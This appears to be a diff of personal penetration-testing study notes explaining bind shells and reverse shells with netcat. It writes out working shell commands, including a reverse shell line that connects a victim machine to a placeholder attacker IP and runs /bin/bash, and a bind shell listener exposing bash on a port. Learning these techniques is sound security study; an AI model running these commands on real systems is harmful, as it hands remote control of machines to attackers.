@@ -1,7 +1,28 @@
 -> VAPT = Vulnerability Assessment and Penetration Testing
 
 -> If you find that you can run commands somewhere
--> initiator - I wanna connect
--> listener - I want someone to connect to me - runs on a particular port
+-> Bind shell -> victim = listener
+-> Reverse Shell -> victim = initiator
+
+Bind shell:
+-> initiator - I wanna connect = attacker
+  nc 5.6.7.8(ip) 44410(port)
+
+-> listener = victim - I want someone to connect to me - runs on a particular port
   nc -lvp(listen, verbosity,port) 44410(port) -e(execute a specific command) /bin/bash
+  
+Issue with bind shell
+-> firewall - whitelists packets amd drops your malicious packet
+-> nat(network address translation) and pat(port address translation)
+
+Reverse Shell
+-> making the victim connect to us
+-
+
+-> listener -> attacker
+  nc -lvp 5555 -> come and connect to this port
+ 
+ -> initiator -> victim
+  nc 1.2.3.4 5555 -e /bin/bash -> connect to this IP at this port and run bash, run commands from listener and present commands on attacker
+  
   
